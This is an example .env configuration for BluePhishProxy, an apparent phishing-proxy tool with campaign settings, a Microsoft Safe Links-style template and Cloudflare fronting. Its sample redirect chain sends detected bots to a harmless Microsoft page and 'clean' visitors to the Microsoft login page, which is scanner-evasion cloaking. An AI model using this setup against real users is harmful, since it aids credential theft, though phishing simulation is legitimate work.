# BluePhishProxy Configuration
# Copy to .env and customize

# ─── Core ────────────────────────────────────────────────────────────
BPP_SECRET_KEY=change-me-to-a-random-string
BPP_PORT=5000
BPP_HOST=0.0.0.0
BPP_SAFE_REDIRECT=https://www.microsoft.com/en-us/security

# ─── Database ────────────────────────────────────────────────────────
BPP_DATABASE_URL=data/bluephishproxy.db

# ─── Authentication ──────────────────────────────────────────────────
# Legacy operator token (backward compat — new deployments should use API keys)
BPP_OPERATOR_TOKEN=
# Rate limit per API key (requests per minute)
BPP_RATE_LIMIT_RPM=60

# ─── Cloudflare ──────────────────────────────────────────────────────
# Set to true when proxied through Cloudflare
BPP_BEHIND_CLOUDFLARE=false

# ─── TLS (dev only — Cloudflare handles TLS in production) ──────────
BPP_TLS_CERT=
BPP_TLS_KEY=

# ─── Single Campaign Focus ──────────────────────────────────────────
# Set a campaign name to auto-create and route all traffic to it
BPP_CAMPAIGN_NAME=
BPP_CAMPAIGN_TEMPLATE=safelinks

# ─── Redirect Chains ────────────────────────────────────────────────
# JSON array of {match, steps} objects. Example:
# BPP_REDIRECT_CHAIN=[{"match":"bot","steps":[{"type":"redirect","url":"https://microsoft.com"}]},{"match":"clean","steps":[{"type":"delay","ms":2000},{"type":"redirect","url":"https://login.microsoftonline.com"}]},{"match":"suspicious","steps":[{"type":"delay","ms":5000},{"type":"redirect","url":"https://microsoft.com/security"}]}]
BPP_REDIRECT_CHAIN=
